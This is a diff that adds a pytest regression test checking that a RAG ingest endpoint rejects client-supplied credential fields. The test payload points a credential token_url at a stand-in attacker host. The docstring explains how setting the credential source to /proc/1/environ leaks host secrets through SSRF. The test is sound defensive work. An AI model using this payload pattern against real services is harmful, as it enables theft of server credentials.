@@ -130,6 +130,57 @@ def test_internal_user_rag_ingest_without_vector_store_id_allowed(client_interna
     )
 
 
+@pytest.mark.parametrize(
+    "blocked_field",
+    [
+        "vertex_credentials",
+        "vertex_ai_credentials",
+        "aws_access_key_id",
+        "aws_secret_access_key",
+        "aws_session_token",
+        "api_key",
+        "api_base",
+    ],
+)
+def test_rag_ingest_blocks_clientside_credentials(client_internal_user, blocked_field):
+    """
+    Credential fields in ingest_options.vector_store must be rejected.
+
+    Accepting user-supplied credentials (e.g. vertex_credentials with
+    type=external_account + credential_source.file=/proc/1/environ) allows
+    any authenticated user to exfiltrate host secrets via SSRF through
+    google-auth's identity_pool credential refresh.
+    """
+    payload = {
+        "ingest_options": {
+            "vector_store": {
+                "custom_llm_provider": "vertex_ai",
+                "vertex_project": "x",
+                blocked_field: {
+                    "type": "external_account",
+                    "token_url": "http://attacker.example/sts",
+                },
+            }
+        }
+    }
+    response = client_internal_user.post(
+        "/v1/rag/ingest",
+        json={
+            **payload,
+            "file": {
+                "filename": "q.txt",
+                "content": "dGVzdA==",
+                "content_type": "text/plain",
+            },
+        },
+    )
+    assert (
+        response.status_code == 400
+    ), f"Expected 400 when '{blocked_field}' is set clientside, got {response.status_code}: {response.json()}"
+    body = response.json()
+    assert blocked_field in str(
+        body
+    ), f"Response should mention '{blocked_field}': {body}"
 class TestRagIngestSSRFBlocked:
     """
     aws_sts_endpoint and related credential-redirect fields must be rejected
